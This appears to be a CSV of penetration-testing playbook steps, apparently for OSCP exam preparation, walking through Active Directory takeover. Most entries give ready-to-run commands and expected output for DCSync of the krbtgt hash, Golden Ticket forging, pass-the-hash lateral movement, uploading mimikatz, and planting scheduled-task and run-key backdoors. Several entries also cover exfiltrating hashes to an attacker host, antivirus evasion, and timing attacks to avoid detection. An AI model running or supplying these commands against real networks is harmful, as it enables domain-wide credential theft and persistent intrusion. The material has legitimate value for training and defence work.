"id","name","objective","description","expected_output","notes"
"document-compromised-hosts","Document All Compromised Systems and Maintain Access","Create comprehensive inventory of compromised assets and establish persistence mechanisms","DOCUMENTATION REQUIREMENTS: Maintain detailed records of all compromised systems for exam reporting and operational tracking.

COMPROMISED SYSTEMS INVENTORY:

Create master spreadsheet/markdown table:

| IP Address      | Hostname | OS           | Access Method | User Account   | Admin Level | Credentials           | Notes                  |
|----------------|----------|--------------|---------------|----------------|-------------|-----------------------|------------------------|
| 192.168.50.75  | WS01     | Win10 Pro    | WMI/RDP       | dave           | Local Admin | dave:Welcome2023      | HR workstation         |
| 192.168.50.82  | WS02     | Win10 Ent    | WMI           | john           | Local Admin | john:CompanyName1!    | Dev workstation        |
| 192.168.50.95  | DC01     | Server 2019  | PSExec/RDP    | Administrator  | Domain Admin| Administrator:Pass123!| Domain Controller      |
| 192.168.50.100 | SQL01    | Server 2016  | WMI           | sqlsvc         | Local Admin | sqlsvc:SQLPass2023    | Database server        |

File: /home/kali/loot/dcsync_[date]/compromised_hosts.md

CREDENTIAL DATABASE:

Organize all extracted credentials:

/home/kali/loot/dcsync_[date]/
├── domain_hashes.ntds (original DCSync output - ALL users)
├── ntlm_hashes.txt (pure NTLM hashes for Hashcat)
├── credentials.txt (cracked username:password pairs)
├── spray_results.txt (crackmapexec PTH spray full output)
├── pwned_systems.txt (systems with local admin access)
├── compromised_hosts.md (detailed inventory table)
└── persistence_mechanisms.md (backup access methods)

BACKUP ACCESS METHODS:

Document multiple access paths to critical systems (in case primary method blocked):

(1) NTLM HASH ACCESS (survives password changes until hash rotation):
System: DC01 (192.168.50.95)
User: Administrator
NTLM Hash: a9b30e5b0dc865eadcea9411e4ade72d
Access: impacket-psexec -hashes :a9b30e5b0dc865eadcea9411e4ade72d corp.com/Administrator@192.168.50.95

(2) PLAINTEXT PASSWORD ACCESS:
System: SQL01 (192.168.50.100)
User: sqlsvc
Password: SQLPass2023
Access: xfreerdp /u:sqlsvc /p:'SQLPass2023' /d:corp.com /v:192.168.50.100 /cert-ignore

(3) CREATED LOCAL ACCOUNTS (if created during engagement):
System: WS01 (192.168.50.75)
User: hacker (created via WMI)
Password: Passw0rd123!
Access: RDP or WMI as hacker user

(4) GOLDEN TICKET (if created in parallel - ultimate persistence):
Domain: corp.com
krbtgt hash: [from domain_hashes.ntds]
Domain SID: [from DCSync output]
Access: See Golden Ticket chain for re-access procedure

PERSISTENCE MECHANISMS:

Optional - If extended access required:

(1) SSH BACKDOOR (via OpenSSH on Windows):
Via WMI/RDP on target:
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

Access: ssh dave@192.168.50.75

(2) SCHEDULED TASK BACKDOOR:
Via WMI:
schtasks /create /tn ""WindowsUpdate"" /tr ""C:\\Windows\\Temp\\backdoor.exe"" /sc onlogon /ru SYSTEM

(3) REGISTRY RUN KEY:
reg add ""HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"" /v Update /t REG_SZ /d ""C:\\Windows\\Temp\\backdoor.exe"" /f

REPORTING SUMMARY:

For exam report, document:

1. DCSYNC STATISTICS:
   - Total domain users: [from domain_hashes.ntds line count]
   - Hashes extracted: [total count]
   - Passwords cracked: [count] ([percentage]%)
   - Time taken: [total time from step 1-4]

2. LATERAL MOVEMENT SUCCESS:
   - Systems scanned: [IP range]
   - Systems with admin access: [count from pwned_systems.txt]
   - Systems compromised: [count from compromised_hosts.md]
   - Access methods used: WMI, PSExec, RDP

3. HIGH-VALUE TARGETS:
   - Domain Controllers: [list]
   - Database Servers: [list]
   - File Servers: [list]
   - Admin Workstations: [list]

4. CREDENTIALS HARVESTED:
   - Domain Admin accounts: [count]
   - Service accounts: [count]
   - User accounts: [count]
   - Total unique passwords: [count]

5. PERSISTENCE:
   - Golden Ticket: [Yes/No - if created]
   - Backup accounts: [count created]
   - Alternative access methods: [list]

EXAM PROOF:

Screenshots required:
- DCSync output (domain_hashes.ntds showing multiple users)
- Hashcat cracked passwords (hashcat --show output)
- crackmapexec spray results (showing Pwn3d! indicators)
- WMI/PSExec shell (whoami showing SYSTEM or admin user)
- RDP desktop showing hostname, IP, username
- Proof.txt or local.txt file contents from compromised systems

SAVE ALL EVIDENCE:
mkdir -p /home/kali/exam_evidence/dcsync_mass_extraction
cp -r /home/kali/loot/dcsync_[date]/* /home/kali/exam_evidence/dcsync_mass_extraction/
scrot -s /home/kali/exam_evidence/dcsync_mass_extraction/screenshots/

TIME ESTIMATE: 10-15 minutes (comprehensive documentation and evidence collection).","",""
"verify-replication-rights","Verify DCSync Permissions and Prerequisites","Confirm compromised account has replication rights required for DCSync attack","PREREQUISITES CHECK: DCSync requires Domain Admin OR Domain User with specific replication permissions.

REQUIRED PERMISSIONS:
(1) DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
(2) DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
(3) Optional: DS-Replication-Get-Changes-In-Filtered-Set (for RODC environments)

VERIFICATION METHODS:

LINUX (Impacket): Test directly with secretsdump - if successful, rights confirmed.
impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'
SUCCESS: Outputs krbtgt NTLM hash → Rights confirmed.
FAILURE: ERROR_ACCESS_DENIED or rpc_s_access_denied → Insufficient rights.

WINDOWS (PowerView): Get-DomainObjectAcl -Identity ""DC=domain,DC=com"" -ResolveGUIDs | ?{$_.ObjectAceType -match ""Replication""}
Look for: Replication-Get-Changes and Replication-Get-Changes-All for compromised user.

CONNECTIVITY TEST: Verify DC reachable on required ports.
sudo nmap -p 445,135,139 -Pn -v <DC_IP>
EXPECTED: 445/tcp open (SMB), 135/tcp open (RPC), 139/tcp open (NetBIOS).

OPSEC: Rights verification does NOT trigger alerts - only actual DCSync attempt (step 2) creates Event 4662.

FAILURE SCENARIOS:
- ERROR_ACCESS_DENIED → Account lacks replication rights (need Domain Admin or add rights manually)
- Connection timeout → Firewall blocking SMB/RPC ports
- KRB_AP_ERR_SKEW → Time sync issue (fix: sudo ntpdate <DC_IP>)

TIME ESTIMATE: 2-5 minutes.","",""
"dcsync-krbtgt-hash","Extract krbtgt Account Hash via DCSync","Use DCSync attack to extract krbtgt account NTLM hash and Domain SID for Golden Ticket creation","KRBTGT ACCOUNT: Special domain account used to sign all Kerberos TGTs. Compromising krbtgt hash = ability to forge any Kerberos ticket for any user (including Domain Admin, Enterprise Admin, disabled accounts).

DCSYNC COMMAND (Impacket - RECOMMENDED):
impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'

Flags explained:
-just-dc-user krbtgt: Extract ONLY krbtgt account (faster, less noisy than full dump)
-outputfile: Optional - save to file for transfer/backup

ALTERNATIVE (Mimikatz on Windows):
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt

OUTPUT ANALYSIS:
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
         ^^^ RID                                 ^^^ NTLM hash (THIS IS GOLDEN TICKET KEY)

DOMAIN SID EXTRACTION: Look for line like:
[*] Domain SID: S-1-5-21-1234567890-1234567890-1234567890
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Save this - required for Golden Ticket

CRITICAL: Document BOTH values:
(1) krbtgt NTLM hash: a9b30e5b0dc865eadcea9411e4ade72d
(2) Domain SID: S-1-5-21-1234567890-1234567890-1234567890

OPSEC CONSIDERATIONS:
- DCSync generates EventID 4662 on DC (Object Access - Replication Activity)
- Replication from non-DC system is HIGHLY suspicious
- BLUE TEAM DETECTION: Replication request from workstation IP, not DC IP
- TIMING: Execute during business hours (0900-1700) to blend with legitimate admin activity
- ALTERNATIVE: If stealth critical, extract NTDS.dit via VSS shadow copy instead (different detection signature)

FAILURE SCENARIOS:
- ERROR_DS_DRA_ACCESS_DENIED → Account lacks replication rights (return to step 1)
- krbtgt account not found → Wrong domain name specified
- Connection lost → Network instability or IDS/IPS blocking

TIME ESTIMATE: 10-30 seconds (single user extraction is fast).","",""
"transfer-hashes-to-kali","Transfer Hashes to Kali (If Extracted on Windows)","Move DCSync output from Windows system to Kali Linux for Golden Ticket creation with Impacket","SKIP IF: DCSync executed on Kali Linux directly (impacket-secretsdump).
Proceed directly to step 4 (create-golden-ticket).

REQUIRED IF: DCSync executed on compromised Windows system (Mimikatz lsadump::dcsync).
Must transfer krbtgt hash and Domain SID to Kali for ticketer.py.

FILE TO TRANSFER: Save DCSync output to text file:
C:\\temp\\krbtgt_hash.txt containing:
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
Domain SID: S-1-5-21-1234567890-1234567890-1234567890

TRANSFER METHODS:

(1) IMPACKET SMB SERVER (RECOMMENDED):
Kali: sudo impacket-smbserver -smb2support -username transfer -password 'TransferPass123!' share /home/kali/loot
Windows: net use \\\\<KALI_IP>\\share /user:transfer TransferPass123!
         copy C:\\temp\\krbtgt_hash.txt \\\\<KALI_IP>\\share\
Windows: net use \\\\<KALI_IP>\\share /delete

(2) BASE64 ENCODE (No SMB connectivity):
Windows: certutil -encode C:\\temp\\krbtgt_hash.txt C:\\temp\\hash.b64
         type C:\\temp\\hash.b64
Copy output, paste on Kali:
Kali: cat > hash.b64 << 'EOF'
<paste Base64 content>
EOF
base64 -d hash.b64 > krbtgt_hash.txt

(3) HTTP EXFILTRATION:
Kali: python3 -m http.server 8000 (setup simple HTTP server)
Windows: curl http://<KALI_IP>:8000/upload -F ""file=@C:\\temp\\krbtgt_hash.txt"" -X POST
OR: Invoke-WebRequest -Uri http://<KALI_IP>:8000 -Method POST -InFile C:\\temp\\krbtgt_hash.txt

(4) MANUAL COPY (Last resort):
Copy hash and SID manually via RDP clipboard, terminal copy/paste.

VALIDATION: Verify file integrity on Kali:
cat krbtgt_hash.txt
Confirm: NTLM hash (32 hex chars) and Domain SID present.

OPSEC: SMB server method creates network traffic. Use encrypted channel if IDS/IPS monitoring active.

TIME ESTIMATE: 1-2 minutes.","",""
"create-golden-ticket","Forge Golden Ticket with Impacket ticketer.py","Create forged Kerberos TGT using krbtgt NTLM hash for persistent domain-wide access","GOLDEN TICKET THEORY: Normal Kerberos auth: User requests TGT from KDC (signed with krbtgt hash) → User presents TGT to request service tickets. Golden Ticket: Attacker creates FAKE TGT signed with stolen krbtgt hash → Domain trusts ticket (valid signature) → No KDC contact needed → Access any service as any user.

IMPACKET TICKETER COMMAND:
impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid <DOMAIN_SID> -domain <DOMAIN_FQDN> <USERNAME>

PARAMETERS:
-nthash: krbtgt NTLM hash from step 2 (32 hex characters)
-domain-sid: Domain SID from step 2 (S-1-5-21-...)
-domain: Target domain FQDN (e.g., corp.com)
<USERNAME>: User to impersonate (e.g., Administrator, Domain Admin username)

OPTIONAL FLAGS (Advanced OPSEC):
-duration <HOURS>: Ticket lifetime (default: 87600 hours = 10 years). Use realistic value for stealth: 10 hours.
-user-id <RID>: User RID (default: 500 = Administrator). Match real user RID for stealth.
-groups <RIDS>: Group memberships (default: 512,513,518,519,520 = Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Admins).

EXAMPLE (Realistic OPSEC-aware ticket):
impacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.com -duration 10 -user-id 1104 Dave

OUTPUT:
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.com/Dave
[*] Signing/Encrypting final ticket
[*]   PAC_LOGON_INFO
[*]   EncTicketPart
[*] Saving ticket in Dave.ccache
          ^^^ OUTPUT FILE (Kerberos credential cache)

CRITICAL: ticketer.py creates .ccache file (e.g., Administrator.ccache, Dave.ccache).
This file contains the forged TGT.

OPSEC STEALTH TECHNIQUES:
(1) Impersonate EXISTING user (not disabled/deleted accounts) - query with: net user /domain OR ldapsearch
(2) Use realistic ticket lifetime (10 hours, not 10 years) - matches domain policy
(3) Match real user RID - extract with: rpcclient -U ""user%pass"" -c ""lookupnames username"" <DC_IP>
(4) Forge ticket for standard user FIRST (test), then escalate to Domain Admin if detected

DETECTION INDICATORS (Blue Team perspective):
- TGT lifetime exceeds domain policy maximum (e.g., 10 years vs 10 hours)
- TGT for disabled/deleted user accounts
- TGT with unusual group memberships (e.g., all admin groups)
- TGT issued outside of DC issuing patterns

TIME ESTIMATE: 5-10 seconds (ticket creation is instant).","",""
"export-ticket-to-environment","Export Golden Ticket to Kerberos Environment","Load forged TGT into Kerberos credential cache for use with Impacket tools","KERBEROS CREDENTIAL CACHE: Linux Kerberos uses credential cache (ccache) to store TGTs/TGS tickets. Impacket tools (psexec, wmiexec, smbexec, secretsdump) check KRB5CCNAME environment variable for ticket location.

EXPORT COMMAND:
export KRB5CCNAME=/path/to/<USERNAME>.ccache

EXAMPLE:
export KRB5CCNAME=/home/kali/loot/Administrator.ccache

VERIFY EXPORT:
echo $KRB5CCNAME
OUTPUT: /home/kali/loot/Administrator.ccache

VIEW TICKET DETAILS (Optional verification):
klist
OUTPUT:
Ticket cache: FILE:/home/kali/loot/Administrator.ccache
Default principal: Administrator@CORP.COM

Valid starting       Expires              Service principal
11/23/2025 10:00:00  11/23/2025 20:00:00  krbtgt/CORP.COM@CORP.COM
^^^ Ticket valid     ^^^ Expiration        ^^^ Service (krbtgt = TGT)

IMPORTANT: KRB5CCNAME is SESSION-SPECIFIC.
If you open new terminal, must re-export.
OR: Add to ~/.bashrc for persistence: echo 'export KRB5CCNAME=/path/to/ticket.ccache' >> ~/.bashrc

ALTERNATIVE METHODS:

(1) Copy to default ccache location:
cp Administrator.ccache /tmp/krb5cc_$(id -u)
export KRB5CCNAME=/tmp/krb5cc_$(id -u)

(2) Use -k flag directly (some Impacket tools):
impacket-psexec -k -no-pass corp.com/Administrator@DC01.corp.com
(Note: Still requires KRB5CCNAME set OR ticket in default location)

KERBEROS CONFIGURATION: Some environments require /etc/krb5.conf configuration:
[libdefaults]
    default_realm = CORP.COM
    dns_lookup_kdc = true
    dns_lookup_realm = false

[realms]
    CORP.COM = {
        kdc = dc01.corp.com
        admin_server = dc01.corp.com
    }

Edit if klist or Impacket tools show ""KDC not found"" errors.

TIME ESTIMATE: 30 seconds.","",""
"validate-golden-ticket-access","Validate Golden Ticket with Impacket Tools","Confirm Golden Ticket works by authenticating to domain resources and executing commands as forged user","VALIDATION STRATEGY: Test Golden Ticket against multiple domain resources to confirm ticket validity and domain-wide access.

TEST 1: SECRETSDUMP (Domain credential dump - requires Domain Admin rights)
impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'

Flags:
-k: Use Kerberos authentication (reads ticket from KRB5CCNAME)
-no-pass: Don't prompt for password (using ticket auth)
<DC_FQDN>: MUST be FQDN (dc01.corp.com), not IP (Kerberos requires hostnames)

SUCCESS OUTPUT:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...
<hundreds of domain user hashes>

TEST 2: PSEXEC (Interactive SYSTEM shell on DC)
impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'

SUCCESS: Drops to C:\\Windows\\system32> prompt with SYSTEM privileges.
Test: whoami → nt authority\\system
      hostname → DC01

TEST 3: WMIEXEC (Stealthy semi-interactive shell)
impacket-wmiexec -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'

SUCCESS: Drops to [*] SMB shell prompt.
Test: whoami → corp\\administrator (runs as user, not SYSTEM)

TEST 4: SMBCLIENT (Access domain shares)
impacket-smbclient -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'

SUCCESS: Lists shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL).
Test: use ADMIN$; ls (confirms admin access to C:\\Windows)

CRITICAL NOTES:
- Golden Ticket auth = NO PASSWORD NEEDED (ticket proves identity)
- MUST use FQDNs for targets (dc01.corp.com), not IPs - Kerberos requires DNS names
- Ticket allows access to ANY domain resource as forged user (DCs, member servers, workstations)
- Access persists until ticket expiration (10 hours to 10 years depending on -duration parameter)

FAILURE SCENARIOS:
- KDC_ERR_TGT_REVOKED: Ticket revoked (krbtgt password changed - rare)
- KRB_AP_ERR_SKEW: Time sync issue (ntpdate <DC_IP>)
- Connection timeout: Network/firewall issue (not auth failure)
- Access denied after successful auth: User lacks permissions (forged wrong user)

PERSISTENCE CONFIRMATION: If ALL tests succeed, Golden Ticket is fully functional.
Save .ccache file for future access (ticket valid until expiration or krbtgt password reset).

TIME ESTIMATE: 3-5 minutes (all validation tests).","",""
"assess-domain-wide-access","Assess Domain-Wide Access and Document Persistence","Verify Golden Ticket provides comprehensive domain access and document persistent access mechanisms","DOMAIN-WIDE ACCESS TESTING: Golden Ticket should grant access to ALL domain resources as the forged user. Systematically test and document access scope.

ACCESS ASSESSMENT CHECKLIST:

(1) DOMAIN CONTROLLERS:
Test: impacket-psexec -k -no-pass 'corp.com/Administrator@DC01.corp.com'
Test: impacket-psexec -k -no-pass 'corp.com/Administrator@DC02.corp.com'
Expected: SYSTEM shell on all DCs (full domain control)

(2) MEMBER SERVERS (File servers, application servers):
Enumerate: crackmapexec smb 192.168.50.0/24 -k --kdcHost DC01.corp.com
Identify domain-joined systems, test access with Golden Ticket.

(3) DOMAIN SHARES:
Test: smbclient -k -no-pass '//DC01.corp.com/SYSVOL'
Test: smbclient -k -no-pass '//DC01.corp.com/NETLOGON'
Test: smbclient -k -no-pass '//FileServer01.corp.com/SharedData'
Expected: Full read/write access to domain shares

(4) ADDITIONAL DCSYNC (Persistence validation):
Test: impacket-secretsdump -k -no-pass 'corp.com/Administrator@DC01.corp.com' -just-dc-ntlm
Expected: Ability to re-extract ALL domain credentials (confirming Domain Admin level access)

(5) LATERAL MOVEMENT:
Test: impacket-wmiexec -k -no-pass 'corp.com/Administrator@Workstation01.corp.com'
Test: impacket-wmiexec -k -no-pass 'corp.com/Administrator@SQLServer.corp.com'
Expected: Shell access on any domain-joined system

PERSISTENCE DOCUMENTATION:

SAVE GOLDEN TICKET COMPONENTS:
(1) krbtgt NTLM hash: [document hash]
(2) Domain SID: [document SID]
(3) Domain FQDN: [document domain]
(4) .ccache file: Copy to secure backup location
    cp Administrator.ccache /home/kali/persistence/corp_golden_ticket_$(date +%Y%m%d).ccache

RE-ACCESS PROCEDURE (Future use):
(1) Set environment: export KRB5CCNAME=/path/to/backup.ccache
(2) Verify ticket: klist (check expiration)
(3) Use Impacket tools with -k -no-pass flags
(4) If expired: Regenerate with saved hash/SID using ticketer.py

TICKET REGENERATION (If expired or lost):
impacket-ticketer -nthash <SAVED_HASH> -domain-sid <SAVED_SID> -domain <DOMAIN> -duration 10 Administrator
export KRB5CCNAME=Administrator.ccache

TICKET LIFETIME:
- Current ticket valid until: [check klist output]
- Maximum validity: 10 years (if -duration not specified) OR until krbtgt password reset
- krbtgt password change frequency: Typically NEVER in most orgs (only after major breach or policy mandate)
- Re-generation: Possible indefinitely as long as krbtgt hash unchanged

DETECTION EVASION:
- Avoid excessive Golden Ticket use (every auth generates logs)
- Blend with normal admin activity (execute during business hours)
- Use realistic ticket parameters (10 hour lifetime, real user RID)
- Rotate between different forged users if multiple compromised

EXAM NOTES: Document Golden Ticket creation timestamp, components, and access scope in exam report. Include:
(1) krbtgt hash extraction method (DCSync command)
(2) Golden Ticket creation command (ticketer.py)
(3) Validation commands (psexec, secretsdump)
(4) Screenshot of domain-wide access (e.g., secretsdump output showing all domain hashes)

TIME ESTIMATE: 5-10 minutes (comprehensive testing and documentation).","",""
"identify-target-systems","Identify Target Systems with Local Admin Access","Find all domain-joined systems where compromised user has local administrator privileges","Use BloodHound to identify systems where compromised user has AdminTo relationship, OR use crackmapexec to enumerate access across the domain.

BloodHound Method (Preferred):
1. Mark compromised user as owned in BloodHound GUI
2. Run custom Cypher query: MATCH (u:User {name:'USER@DOMAIN.COM'})-[:AdminTo]->(c:Computer) RETURN u,c
3. Graph view shows all systems with local admin access
4. Prioritize workstations over servers (more likely to have service sessions)

Crackmapexec Method (Manual enumeration):
1. Run: crackmapexec smb 10.10.10.0/24 -u username -p password --local-auth
2. Look for 'Pwn3d!' indicator showing local admin access
3. Save list of accessible systems for further enumeration

Target Selection Criteria:
- Domain-joined workstations (not standalone)
- Systems with uptime >7 days (more likely to have cached credentials)
- Systems used by IT/helpdesk (higher privilege accounts)
- Systems running monitoring agents or backup software

Expected Output:
List of 5-20 systems with local admin access. Even ONE system with service session is sufficient for domain compromise.

CRITICAL: Don't stop at first system - service sessions are NOT guaranteed on every workstation. Be prepared to check 3-5 systems.","",""
"check-for-service-sessions","Check for Domain Admin Service Sessions","Identify which accessible systems have Domain Admin service sessions cached in memory","Use BloodHound HasSession query OR manual enumeration to identify systems with high-value sessions.

BloodHound Method (Fastest):
1. Run query: MATCH (c:Computer)<-[:HasSession]-(u:User) WHERE u.name CONTAINS 'ADMIN' RETURN c,u
2. Filter for Domain Admin accounts (check group membership)
3. Cross-reference with systems from step 1 (where you have local admin)
4. Target: Systems where you have BOTH local admin AND DA service session

Manual Method (If BloodHound unavailable):
1. Connect to each system with local admin access
2. Run: net sessions (shows active sessions - unreliable for service sessions)
3. Run: query user (shows interactive sessions - NOT service sessions)
4. Proceed to credential dump on ALL accessible systems (service sessions not visible externally)

Target Indicators:
- Systems running SCOM, Nagios, SolarWinds (monitoring as Domain Admin)
- Systems with Veeam, Commvault, Backup Exec (backup as Domain Admin)
- Systems with scheduled tasks (check Task Scheduler for DA accounts)
- Domain Controllers (always have service sessions, but harder to compromise)

IMPORTANT: Service sessions are NOT visible via 'net sessions' or 'query user'. The ONLY way to confirm is credential dump with mimikatz. BloodHound HasSession query is based on Kerberos tickets, which ARE visible remotely.

If BloodHound shows no HasSession relationships for Domain Admins:
- Proceed anyway - BloodHound data may be stale
- Target systems with high uptime
- Check multiple systems (service sessions are common but not guaranteed)","",""
"lateral-movement","Lateral Movement to Target System","Establish interactive session on target system to perform credential harvesting","Use Evil-WinRM (preferred) or PSExec to connect to target system with local admin credentials.

Evil-WinRM Method (Preferred for OSCP):
1. Syntax: evil-winrm -i <TARGET_IP> -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>'
2. Alternative (Pass-the-Hash): evil-winrm -i <TARGET_IP> -u '<DOMAIN>\<USERNAME>' -H <NTLM_HASH>
3. Verify access: whoami, hostname, whoami /groups
4. Check privileges: whoami /priv (should show SeDebugPrivilege available)

PSExec Method (Alternative):
1. Syntax: impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
2. Gets SYSTEM shell directly (no need for privilege escalation)
3. Less stealthy (creates service, writes to disk)

Connection Troubleshooting:
- WinRM not enabled: Try PSExec, SMB, or RDP instead
- Authentication fails: Verify credentials with crackmapexec first
- Network unreachable: Check routing, pivoting requirements
- AV blocks connection: Use obfuscated tools or SOCKS proxy

CRITICAL SYNTAX: Evil-WinRM requires 'DOMAIN\user' format (NOT -d flag). Single quotes around username to escape backslash in bash.

Expected Session:
- Interactive PowerShell prompt (Evil-WinRM) OR cmd prompt (PSExec)
- Confirm username and hostname match target system
- Verify local admin by checking C:\Windows\System32 write access","",""
"upload-mimikatz","Upload Mimikatz to Target System","Transfer mimikatz binary to writable directory on target system","Upload mimikatz.exe to target system using Evil-WinRM file upload functionality OR alternative transfer methods.

Evil-WinRM Upload (Easiest):
1. From Evil-WinRM session: cd C:\temp (or C:\Users\Public, C:\Windows\temp)
2. Upload mimikatz: upload /path/to/mimikatz.exe
3. Verify upload: dir mimikatz.exe (confirm file size ~1.2 MB)
4. Test execution: .\mimikatz.exe ""exit"" (should run without error)

Alternative Transfer Methods:
1. SMB Copy: copy \\<ATTACKER_IP>\share\mimikatz.exe C:\temp\
2. PowerShell Download: IWR -Uri http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\temp\mimikatz.exe
3. Base64 Encoding: Split large file into chunks, decode on target
4. Certutil: certutil -urlcache -split -f http://<ATTACKER_IP>/mimikatz.exe C:\temp\mimikatz.exe

Antivirus Evasion:
- Use obfuscated mimikatz (mimikatz_trunk.7z from GitHub, extract and rename)
- Use pypykatz (Python alternative, requires Python on target)
- Use Invoke-Mimikatz (in-memory PowerShell, no disk write)
- Use procdump + offline parsing (dump LSASS, parse locally with pypykatz)

Writable Directories (Priority Order):
1. C:\temp (may not exist, create first: mkdir C:\temp)
2. C:\Users\Public
3. C:\Windows\temp (requires higher privileges)
4. C:\Users\<USERNAME>\AppData\Local\Temp

IMPORTANT: If AV deletes mimikatz immediately after upload, use alternative methods. Many OSCP labs have AV disabled, but real environments often don't.","",""
"enable-debug-privilege","Enable SeDebugPrivilege","Enable SeDebugPrivilege token required for LSASS memory access","Run mimikatz 'privilege::debug' command to enable SeDebugPrivilege. This is MANDATORY before any sekurlsa commands.

Command Execution:
1. Run: .\mimikatz.exe ""privilege::debug"" ""exit""
2. Expected output: 'Privilege '20' OK' (indicates SeDebugPrivilege enabled)
3. If fails: Check if local admin (whoami /priv should show SeDebugPrivilege)

WHY THIS IS MANDATORY:
Even local administrators don't automatically have SeDebugPrivilege ENABLED. The privilege exists in the token but is disabled by default. Mimikatz 'privilege::debug' enables it. Without this:
- sekurlsa::logonpasswords returns 'ERROR 0x00000005 Access Denied'
- LSASS memory is protected, mimikatz cannot read credentials
- #1 mimikatz failure in OSCP exams

Troubleshooting:
- 'Privilege '20' KO': Not local administrator, or UAC blocking privilege elevation
- UAC enabled: Run mimikatz from elevated prompt, or disable UAC temporarily
- SeDebugPrivilege not in token: User not in Administrators group, recheck access

Alternative if privilege::debug fails:
- Use PSExec to get SYSTEM shell (SYSTEM always has SeDebugPrivilege)
- Disable UAC: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f (requires reboot)
- Use procdump to dump LSASS, parse offline (doesn't require SeDebugPrivilege on target)

Verification:
Run: whoami /priv
Look for: SeDebugPrivilege                  Enabled
If shows 'Disabled', mimikatz privilege::debug should enable it.","",""
